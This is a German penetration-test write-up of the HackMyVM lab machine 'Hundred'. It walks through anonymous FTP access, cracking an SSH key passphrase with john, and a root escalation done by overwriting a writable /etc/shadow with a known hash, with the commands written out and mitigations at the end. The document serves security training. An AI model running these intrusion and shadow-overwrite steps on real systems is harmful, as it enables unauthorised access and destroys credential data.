# Hundred (HackMyVM) - Penetration Test Bericht

![Hundred.png](Hundred.png)

**Datum des Berichts:** 12. Oktober 2022  
**VM:** Hundred  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Hundred](https://hackmyvm.eu/machines/machine.php?vm=Hundred)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hundred_HackMyVM_Easy/](https://alientec1908.github.io/Hundred_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Information Disclosure & Initial Access](#phase-2-information-disclosure--initial-access)
5.  [Phase 3: Privilege Escalation (`/etc/shadow` Manipulation)](#phase-3-privilege-escalation-etcshadow-manipulation)
6.  [Proof of Concept (Root Access)](#proof-of-concept-root-access)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Hundred" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung offenbarte offene FTP-, SSH- und HTTP-Dienste. Der FTP-Dienst erlaubte **anonymen Zugriff** und enthielt kritische Dateien wie SSH-Schlüssel (`id_rsa`, `id_rsa.pem`) und eine Benutzerliste (`users.txt`). Ein weiterer privater SSH-Schlüssel wurde über einen obskuren Pfad auf dem Webserver gefunden. Dieser mit einer Passphrase geschützte Schlüssel wurde mittels `ssh2john` und `john` geknackt (Passphrase: `d4t4s3c#1`). Dies ermöglichte den SSH-Zugriff als Benutzer `hmv`.

Die Privilegieneskalation zu Root-Rechten erfolgte durch eine **schwerwiegende Fehlkonfiguration**: Der Benutzer `hmv` hatte Schreibrechte auf die Datei `/etc/shadow`. Dies wurde ausgenutzt, indem der Passwort-Hash des `root`-Benutzers durch einen bekannten Hash für das Passwort `root` ersetzt wurde. Anschließend war ein direkter Login als `root` mit dem Passwort `root` möglich.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `curl`
*   `ssh2john`
*   `john` (John the Ripper)
*   `ssh`
*   `cat`
*   `openssl` (passwd)
*   `echo`
*   `su`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.146` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -sV -A 192.168.2.146 -p-`) offenbarte:
        *   **Port 21 (FTP):** vsftpd 3.0.3. **Kritisch:** Anonymer Login erlaubt. Nmap listete die Dateien `id_rsa`, `id_rsa.pem`, `id_rsa.pub` und `users.txt` im FTP-Root auf, die als "writeable" markiert waren.
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian
        *   **Port 80 (HTTP):** nginx 1.14.2 (Hostname: `hund.hmv`)

---

## Phase 2: Information Disclosure & Initial Access

1.  **Web Enumeration:**
    *   `gobuster dir` auf Port 80 fand nur `/index.html` und `/logo.jpg`, was für den weiteren Verlauf nicht relevant war.
    *   Über einen nicht durch `gobuster` gefundenen, obskuren Pfad (`/softyhackb4el7dshelldredd/id_rsa`) wurde via `curl` ein privater SSH-Schlüssel vom Webserver heruntergeladen.

2.  **SSH-Schlüssel-Analyse und Passphrase-Cracking:**
    *   Der über den Webserver gefundene SSH-Schlüssel (lokal als `idr` gespeichert) war passwortgeschützt.
    *   `ssh2john idr > hundert.hash` extrahierte den Hash.
    *   `john --wordlist=/usr/share/wordlists/rockyou.txt hundert.hash` knackte die Passphrase: `d4t4s3c#1`.

3.  **SSH-Login als `hmv`:**
    *   Der Benutzername `hmv` wurde (vermutlich aus der `users.txt` vom FTP-Server, dieser Schritt fehlt im Log) identifiziert.
    *   Mit dem privaten Schlüssel `idr` und der Passphrase `d4t4s3c#1` wurde ein SSH-Login durchgeführt:
        ```bash
        ssh -i idr hmv@192.168.2.146
        # Passphrase: d4t4s3c#1
        ```
    *   Initialer Zugriff als `hmv` auf dem System `hundred` wurde erlangt.
    *   Die User-Flag `HMV100vmyay` wurde in `/home/hmv/user.txt` gefunden.

---

## Phase 3: Privilege Escalation (`/etc/shadow` Manipulation)

1.  **Erzeugung eines bekannten Root-Passwort-Hashes:**
    *   Als Benutzer `hmv` wurde `openssl passwd` verwendet, um den Hash für das Passwort `root` zu generieren:
        ```bash
        hmv@hundred:~$ openssl passwd
        Password: root
        Verifying - Password: root
        .LQrZnK1qh9TI 
        ```
2.  **Überschreiben von `/etc/shadow`:**
    *   Es wurde festgestellt, dass der Benutzer `hmv` Schreibrechte auf die Datei `/etc/shadow` hatte (kritische Fehlkonfiguration).
    *   Die `/etc/shadow`-Datei wurde mit einem neuen Eintrag für `root` überschrieben, wobei der zuvor generierte Hash verwendet wurde:
        ```bash
        hmv@hundred:~$ echo "root:.LQrZnK1qh9TI:18844:0:99999:7:::" > /etc/shadow
        ```
    *   Damit wurde das Passwort des `root`-Benutzers effektiv auf `root` gesetzt.

3.  **Benutzerwechsel zu `root`:**
    *   `hmv@hundred:~$ su -l` mit dem Passwort `root` war erfolgreich.
    *   Voller Root-Zugriff wurde erlangt.

---

## Proof of Concept (Root Access)

**Kurzbeschreibung:** Die Privilegieneskalation erfolgte durch Ausnutzung unsicherer Dateiberechtigungen. Der Benutzer `hmv` hatte Schreibzugriff auf `/etc/shadow`. Dies erlaubte das Überschreiben des Passwort-Hashes des `root`-Benutzers mit einem bekannten Hash für das Passwort "root".

**Schritte (als `hmv`):**
1.  Generiere den Hash für das gewünschte neue Root-Passwort (hier "root"):
    ```bash
    openssl passwd 
    # Gib zweimal "root" ein. Merke dir den ausgegebenen Hash (z.B. ".LQrZnK1qh9TI").
    ```
2.  Überschreibe `/etc/shadow` mit dem neuen Root-Eintrag:
    ```bash
    echo "root:[HIER_DEN_GENERIERTE_HASH_EINFÜGEN]:18844:0:99999:7:::" > /etc/shadow
    # Beispiel: echo "root:.LQrZnK1qh9TI:18844:0:99999:7:::" > /etc/shadow
    ```
3.  Wechsle zum `root`-Benutzer mit dem neuen Passwort:
    ```bash
    su -l
    # Passwort: root
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/hmv/user.txt`):**
    ```
    HMV100vmyay
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    HMVkeephacking
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **FTP-Sicherheit:**
    *   **DRINGEND:** Deaktivieren Sie den anonymen FTP-Zugriff (`anonymous_enable=NO` in `vsftpd.conf`).
    *   Entfernen Sie sensible Dateien (SSH-Schlüssel, Benutzerlisten) von allen FTP-Verzeichnissen, insbesondere von solchen, die anonym zugänglich sind.
    *   Beschränken Sie Schreibrechte für anonyme oder niedrigprivilegierte FTP-Benutzer.
*   **Webserver-Sicherheit:**
    *   **Entfernen Sie private SSH-Schlüssel und andere sensible Dateien sofort aus dem Webroot** und allen über das Web erreichbaren Pfaden. Überprüfen Sie die Webserver-Konfiguration und Dateiberechtigungen sorgfältig.
*   **SSH-Schlüssel-Management:**
    *   Private SSH-Schlüssel sollten niemals auf unsicheren Wegen (FTP, Web) geteilt oder gespeichert werden.
    *   Erzwingen Sie starke, einzigartige Passphrasen für alle SSH-Schlüssel.
*   **Dateisystemberechtigungen:**
    *   **KRITISCH:** Korrigieren Sie sofort die Berechtigungen der Datei `/etc/shadow`. Sie sollte nur für den Benutzer `root` lesbar und schreibbar sein (typischerweise `chmod 640` oder `chmod 600`) und der Gruppe `shadow` oder `root` gehören. **Kein anderer Benutzer darf Schreibrechte auf `/etc/shadow` haben.**
    *   Führen Sie regelmäßige Überprüfungen der Dateiberechtigungen für kritische Systemdateien durch.
*   **Passwortsicherheit:**
    *   Setzen Sie ein starkes, einzigartiges Passwort für den `root`-Benutzer und alle anderen Benutzerkonten.
    *   Vermeiden Sie einfache oder leicht zu erratende Passwörter.
*   **Allgemeine Systemhärtung:**
    *   Halten Sie alle Dienste (SSH, FTP, Webserver) auf dem neuesten Stand.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten und Zugriffsversuche.

---

**Ben C. - Cyber Security Reports**
